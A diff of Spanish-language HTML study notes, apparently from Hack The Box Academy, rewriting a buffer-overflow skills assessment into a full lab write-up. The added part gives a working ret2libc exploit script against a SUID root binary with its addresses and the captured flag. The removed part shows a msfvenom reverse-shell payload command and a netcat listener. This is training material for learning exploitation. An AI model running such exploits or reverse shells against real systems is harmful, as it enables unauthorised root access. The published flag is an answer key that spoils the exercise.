@@ -188,21 +188,22 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
   <ul>
   <li><a href="#skills-assessment" id="toc-skills-assessment" class="nav-link active" data-scroll-target="#skills-assessment">Skills Assessment</a>
   <ul class="collapse">
-  <li><a href="#objetivos" id="toc-objetivos" class="nav-link" data-scroll-target="#objetivos">Objetivos</a></li>
-  <li><a href="#metodología" id="toc-metodología" class="nav-link" data-scroll-target="#metodología">Metodología</a>
+  <li><a href="#escenario" id="toc-escenario" class="nav-link" data-scroll-target="#escenario">Escenario</a></li>
+  <li><a href="#objetivo" id="toc-objetivo" class="nav-link" data-scroll-target="#objetivo">Objetivo</a></li>
+  <li><a href="#paso-1-análisis-del-binario" id="toc-paso-1-análisis-del-binario" class="nav-link" data-scroll-target="#paso-1-análisis-del-binario">Paso 1: Análisis del Binario</a></li>
+  <li><a href="#paso-2-determinar-offset" id="toc-paso-2-determinar-offset" class="nav-link" data-scroll-target="#paso-2-determinar-offset">Paso 2: Determinar Offset</a></li>
+  <li><a href="#paso-3-stack-size" id="toc-paso-3-stack-size" class="nav-link" data-scroll-target="#paso-3-stack-size">Paso 3: Stack Size</a></li>
+  <li><a href="#paso-4-ret2libc-exploit" id="toc-paso-4-ret2libc-exploit" class="nav-link" data-scroll-target="#paso-4-ret2libc-exploit">Paso 4: Ret2libc Exploit</a>
   <ul class="collapse">
-  <li><a href="#paso-1-análisis-inicial" id="toc-paso-1-análisis-inicial" class="nav-link" data-scroll-target="#paso-1-análisis-inicial">Paso 1: Análisis Inicial</a></li>
-  <li><a href="#paso-2-identificar-función-vulnerable" id="toc-paso-2-identificar-función-vulnerable" class="nav-link" data-scroll-target="#paso-2-identificar-función-vulnerable">Paso 2: Identificar Función Vulnerable</a></li>
-  <li><a href="#paso-3-determinar-offset" id="toc-paso-3-determinar-offset" class="nav-link" data-scroll-target="#paso-3-determinar-offset">Paso 3: Determinar Offset</a></li>
-  <li><a href="#paso-4-bad-characters" id="toc-paso-4-bad-characters" class="nav-link" data-scroll-target="#paso-4-bad-characters">Paso 4: Bad Characters</a></li>
-  <li><a href="#paso-5-generar-shellcode" id="toc-paso-5-generar-shellcode" class="nav-link" data-scroll-target="#paso-5-generar-shellcode">Paso 5: Generar Shellcode</a></li>
-  <li><a href="#paso-6-encontrar-return-address" id="toc-paso-6-encontrar-return-address" class="nav-link" data-scroll-target="#paso-6-encontrar-return-address">Paso 6: Encontrar Return Address</a></li>
-  <li><a href="#paso-7-exploit-final" id="toc-paso-7-exploit-final" class="nav-link" data-scroll-target="#paso-7-exploit-final">Paso 7: Exploit Final</a></li>
+  <li><a href="#encontrar-direcciones" id="toc-encontrar-direcciones" class="nav-link" data-scroll-target="#encontrar-direcciones">Encontrar Direcciones</a></li>
+  <li><a href="#calcular-direcciones" id="toc-calcular-direcciones" class="nav-link" data-scroll-target="#calcular-direcciones">Calcular Direcciones</a></li>
+  <li><a href="#exploit-final" id="toc-exploit-final" class="nav-link" data-scroll-target="#exploit-final">Exploit Final</a></li>
+  <li><a href="#ejecución" id="toc-ejecución" class="nav-link" data-scroll-target="#ejecución">Ejecución</a></li>
   </ul></li>
-  <li><a href="#checklist-de-éxito" id="toc-checklist-de-éxito" class="nav-link" data-scroll-target="#checklist-de-éxito">Checklist de Éxito</a></li>
-  <li><a href="#comandos-clave" id="toc-comandos-clave" class="nav-link" data-scroll-target="#comandos-clave">Comandos Clave</a></li>
-  <li><a href="#troubleshooting" id="toc-troubleshooting" class="nav-link" data-scroll-target="#troubleshooting">Troubleshooting</a></li>
-  <li><a href="#recursos" id="toc-recursos" class="nav-link" data-scroll-target="#recursos">Recursos</a></li>
+  <li><a href="#flag" id="toc-flag" class="nav-link" data-scroll-target="#flag">Flag</a></li>
+  <li><a href="#estructura-del-payload" id="toc-estructura-del-payload" class="nav-link" data-scroll-target="#estructura-del-payload">Estructura del Payload</a></li>
+  <li><a href="#resumen" id="toc-resumen" class="nav-link" data-scroll-target="#resumen">Resumen</a></li>
+  <li><a href="#achievement" id="toc-achievement" class="nav-link" data-scroll-target="#achievement">Achievement</a></li>
   </ul></li>
   </ul>
 </nav>
@@ -216,177 +217,189 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <section id="skills-assessment" class="level1">
 <h1>Skills Assessment</h1>
 <p>La evaluación práctica pone a prueba todos los conceptos aprendidos en el módulo.</p>
-<section id="objetivos" class="level2">
-<h2 class="anchored" data-anchor-id="objetivos">Objetivos</h2>
-<ol type="1">
-<li>Identificar vulnerabilidad de buffer overflow</li>
-<li>Determinar el offset exacto</li>
-<li>Identificar bad characters</li>
-<li>Generar shellcode funcional</li>
-<li>Obtener acceso al sistema</li>
-</ol>
+<section id="escenario" class="level2">
+<h2 class="anchored" data-anchor-id="escenario">Escenario</h2>
+<p>Accedimos por SSH a una máquina Linux con un usuario estándar <code>htb-student</code> que puede dejar mensajes usando un programa SUID root llamado <code>leave_msg</code>.</p>
 </section>
-<section id="metodología" class="level2">
-<h2 class="anchored" data-anchor-id="metodología">Metodología</h2>
-<section id="paso-1-análisis-inicial" class="level3">
-<h3 class="anchored" data-anchor-id="paso-1-análisis-inicial">Paso 1: Análisis Inicial</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">file</span> <span class="op">&lt;</span>binary<span class="op">&gt;</span></span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> <span class="op">&lt;</span>binary<span class="op">&gt;</span></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span> <span class="at">-q</span> <span class="op">&lt;</span>binary<span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<section id="objetivo" class="level2">
+<h2 class="anchored" data-anchor-id="objetivo">Objetivo</h2>
+<p>Explotar un Stack-Based Buffer Overflow para leer <code>/root/flag.txt</code>.</p>
 </section>
-<section id="paso-2-identificar-función-vulnerable" class="level3">
-<h3 class="anchored" data-anchor-id="paso-2-identificar-función-vulnerable">Paso 2: Identificar Función Vulnerable</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">disassemble</span> main</span>
-<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">disassemble</span> <span class="op">&lt;</span>funcion<span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-<section id="paso-3-determinar-offset" class="level3">
-<h3 class="anchored" data-anchor-id="paso-3-determinar-offset">Paso 3: Determinar Offset</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Crear patrón</span></span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pattern_create.rb</span> <span class="at">-l</span> 2000</span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejecutar y obtener EIP</span></span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">run</span> <span class="va">$(</span><span class="fu">cat</span> pattern.txt<span class="va">)</span></span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">info</span> registers eip</span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Calcular offset</span></span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ex">pattern_offset.rb</span> <span class="at">-q</span> 0x<span class="op">&lt;</span>eip_value<span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-<section id="paso-4-bad-characters" class="level3">
-<h3 class="anchored" data-anchor-id="paso-4-bad-characters">Paso 4: Bad Characters</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Crear lista de todos los bytes</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Enviar payload con CHARS</span></span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Examinar stack para encontrar roturas</span></span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/500xb</span> <span class="va">$esp</span>+offset</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-<section id="paso-5-generar-shellcode" class="level3">
-<h3 class="anchored" data-anchor-id="paso-5-generar-shellcode">Paso 5: Generar Shellcode</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> linux/x86/shell_reverse_tcp <span class="dt">\</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  LHOST=<span class="op">&lt;</span>IP<span class="op">&gt;</span> LPORT=<span class="op">&lt;</span>PORT<span class="op">&gt;</span> <span class="dt">\</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">--arch</span> x86 <span class="at">--platform</span> linux <span class="dt">\</span></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">--bad-chars</span> <span class="st">"&lt;bad_chars&gt;"</span> <span class="dt">\</span></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-f</span> c</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-<section id="paso-6-encontrar-return-address" class="level3">
-<h3 class="anchored" data-anchor-id="paso-6-encontrar-return-address">Paso 6: Encontrar Return Address</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">run</span> <span class="va">$(</span><span class="ex">python</span> <span class="at">-c</span> <span class="st">'print "&lt;payload&gt;"'</span><span class="va">)</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">info</span> registers esp</span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/200xb</span> <span class="va">$esp</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-<section id="paso-7-exploit-final" class="level3">
-<h3 class="anchored" data-anchor-id="paso-7-exploit-final">Paso 7: Exploit Final</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Listener</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> <span class="op">&lt;</span>PORT<span class="op">&gt;</span></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejecutar exploit</span></span>
-<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">./</span><span class="op">&lt;</span>binary<span class="op">&gt;</span> <span class="va">$(</span><span class="ex">python</span> exploit.py<span class="va">)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-</section>
-</section>
-<section id="checklist-de-éxito" class="level2">
-<h2 class="anchored" data-anchor-id="checklist-de-éxito">Checklist de Éxito</h2>
+<section id="paso-1-análisis-del-binario" class="level2">
+<h2 class="anchored" data-anchor-id="paso-1-análisis-del-binario">Paso 1: Análisis del Binario</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">file</span> /home/htb-student/leave_msg</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Resultado:</strong></p>
+<pre><code>setuid ELF 32-bit LSB shared object, Intel 80386</code></pre>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Tarea</th>
-<th>Completado</th>
+<th>Propiedad</th>
+<th>Valor</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Offset identificado</td>
-<td>[ ]</td>
+<td>Archivo</td>
+<td>ELF 32-bit</td>
 </tr>
 <tr class="even">
-<td>Bad characters encontrados</td>
-<td>[ ]</td>
+<td>SUID</td>
+<td>root</td>
 </tr>
 <tr class="odd">
-<td>Shellcode generado</td>
-<td>[ ]</td>
-</tr>
-<tr class="even">
-<td>Return address calculada</td>
-<td>[ ]</td>
-</tr>
-<tr class="odd">
-<td>Reverse shell obtenida</td>
-<td>[ ]</td>
+<td>Arquitectura</td>
+<td>x86</td>
 </tr>
 </tbody>
 </table>
 </section>
-<section id="comandos-clave" class="level2">
-<h2 class="anchored" data-anchor-id="comandos-clave">Comandos Clave</h2>
+<section id="paso-2-determinar-offset" class="level2">
+<h2 class="anchored" data-anchor-id="paso-2-determinar-offset">Paso 2: Determinar Offset</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span> <span class="at">-q</span> /home/htb-student/leave_msg</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">run</span> <span class="va">$(</span><span class="ex">python3</span> <span class="at">-c</span> <span class="st">"print('A' * 2060 + 'BBBB')"</span><span class="va">)</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">info</span> registers eip</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Resultado:</strong></p>
+<pre><code>eip    0x42424242    0x42424242</code></pre>
+<p><strong>Offset = 2060 bytes</strong></p>
+</section>
+<section id="paso-3-stack-size" class="level2">
+<h2 class="anchored" data-anchor-id="paso-3-stack-size">Paso 3: Stack Size</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">info</span> proc mappings</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Resultado:</strong></p>
+<pre><code>Start Addr   End Addr       Size
+0xfffdc000 0xffffe000    0x22000  [stack]</code></pre>
+<p><strong>Stack Size = 0x22000</strong></p>
+</section>
+<section id="paso-4-ret2libc-exploit" class="level2">
+<h2 class="anchored" data-anchor-id="paso-4-ret2libc-exploit">Paso 4: Ret2libc Exploit</h2>
+<section id="encontrar-direcciones" class="level3">
+<h3 class="anchored" data-anchor-id="encontrar-direcciones">Encontrar Direcciones</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Dirección de system</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> system</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span> = {<span class="op">&lt;</span>text variable, no debug info<span class="op">&gt;</span>} 0xf7e29e10 <span class="op">&lt;</span>system<span class="op">&gt;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Offset de /bin/sh en libc</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> <span class="at">-a</span> <span class="at">-t</span> x /lib32/libc-2.27.so <span class="kw">|</span> <span class="fu">grep</span> /bin/sh</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">17b88f</span> /bin/sh</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Ret gadget en libc</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-c</span> <span class="st">"data = open('/lib32/libc-2.27.so', 'rb').read(); print(hex(data.find(b'</span><span class="dt">\\</span><span class="st">xc3')))"</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x417</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="calcular-direcciones" class="level3">
+<h3 class="anchored" data-anchor-id="calcular-direcciones">Calcular Direcciones</h3>
+<pre><code>libc_base = 0xf7ded000
+system    = 0xf7e29e10
+/bin/sh   = libc_base + 0x17b88f = 0xf7f6888f
+ret       = libc_base + 0x417 = 0xf7ded417</code></pre>
+</section>
+<section id="exploit-final" class="level3">
+<h3 class="anchored" data-anchor-id="exploit-final">Exploit Final</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Padding hasta EIP</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> <span class="st">b"A"</span> <span class="op">*</span> <span class="dv">2060</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Direcciones</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>libc_base <span class="op">=</span> <span class="bn">0xf7ded000</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> <span class="bn">0xf7e29e10</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>binsh_addr <span class="op">=</span> libc_base <span class="op">+</span> <span class="bn">0x17b88f</span>  <span class="co"># 0xf7f6888f</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>exit_addr <span class="op">=</span> libc_base <span class="op">+</span> <span class="bn">0x3d0b0</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Payload ret2libc</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> padding</span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">"&lt;I"</span>, system_addr)  <span class="co"># EIP -&gt; system</span></span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">"&lt;I"</span>, exit_addr)    <span class="co"># return address (exit)</span></span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">"&lt;I"</span>, binsh_addr)   <span class="co"># argumento: /bin/sh</span></span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a>sys.stdout.<span class="bu">buffer</span>.write(payload)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="ejecución" class="level3">
+<h3 class="anchored" data-anchor-id="ejecución">Ejecución</h3>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/htb-student/leave_msg</span> <span class="va">$(</span><span class="ex">python3</span> exploit.py<span class="va">)</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="co"># cat /root/flag.txt</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+</section>
+<section id="flag" class="level2">
+<h2 class="anchored" data-anchor-id="flag">Flag</h2>
+<pre><code>HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}</code></pre>
+</section>
+<section id="estructura-del-payload" class="level2">
+<h2 class="anchored" data-anchor-id="estructura-del-payload">Estructura del Payload</h2>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Comando</th>
-<th>Propósito</th>
+<th>Componente</th>
+<th>Tamaño</th>
+<th>Contenido</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td><code>pattern_create.rb -l N</code></td>
-<td>Crear patrón único</td>
+<td>Padding</td>
+<td>2060 bytes</td>
+<td>“A” * 2060</td>
 </tr>
 <tr class="even">
-<td><code>pattern_offset.rb -q ADDR</code></td>
-<td>Calcular offset</td>
+<td>EIP</td>
+<td>4 bytes</td>
+<td>system() address</td>
 </tr>
 <tr class="odd">
-<td><code>msfvenom -p ...</code></td>
-<td>Generar shellcode</td>
+<td>Return</td>
+<td>4 bytes</td>
+<td>exit() address</td>
 </tr>
 <tr class="even">
-<td><code>x/Nxb $esp</code></td>
-<td>Examinar stack</td>
-</tr>
-<tr class="odd">
-<td><code>info registers eip</code></td>
-<td>Ver EIP</td>
-</tr>
-<tr class="even">
-<td><code>nc -lvnp PORT</code></td>
-<td>Listener netcat</td>
+<td>Argumento</td>
+<td>4 bytes</td>
+<td>/bin/sh address</td>
 </tr>
 </tbody>
 </table>
 </section>
-<section id="troubleshooting" class="level2">
-<h2 class="anchored" data-anchor-id="troubleshooting">Troubleshooting</h2>
+<section id="resumen" class="level2">
+<h2 class="anchored" data-anchor-id="resumen">Resumen</h2>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Problema</th>
-<th>Solución</th>
+<th>Parámetro</th>
+<th>Valor</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>EIP no sobrescrito</td>
-<td>Aumentar tamaño del buffer</td>
+<td>File type</td>
+<td>ELF 32-bit</td>
 </tr>
 <tr class="even">
-<td>Shellcode no ejecuta</td>
-<td>Verificar bad chars</td>
+<td>Offset</td>
+<td>2060 bytes</td>
 </tr>
 <tr class="odd">
-<td>Conexión rechazada</td>
-<td>Verificar firewall/LPORT</td>
+<td>Stack size</td>
+<td>0x22000</td>
 </tr>
 <tr class="even">
-<td>Crash sin shell</td>
-<td>Verificar return address</td>
+<td>Vulnerabilidad</td>
+<td>strcpy sin bounds check</td>
+</tr>
+<tr class="odd">
+<td>Técnica</td>
+<td>Ret2libc</td>
+</tr>
+<tr class="even">
+<td>Flag</td>
+<td>HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}</td>
 </tr>
 </tbody>
 </table>
 </section>
-<section id="recursos" class="level2">
-<h2 class="anchored" data-anchor-id="recursos">Recursos</h2>
-<ul>
-<li><a href="https://www.exploit-db.com/">Exploit Database</a></li>
-<li><a href="https://www.metasploit.com/">Metasploit Framework</a></li>
-<li><a href="http://shell-storm.org/shellcode/">Shell Storm</a></li>
-</ul>
+<section id="achievement" class="level2">
+<h2 class="anchored" data-anchor-id="achievement">Achievement</h2>
+<p>https://academy.hackthebox.com/achievement/2300153/31</p>
 
 
 </section>
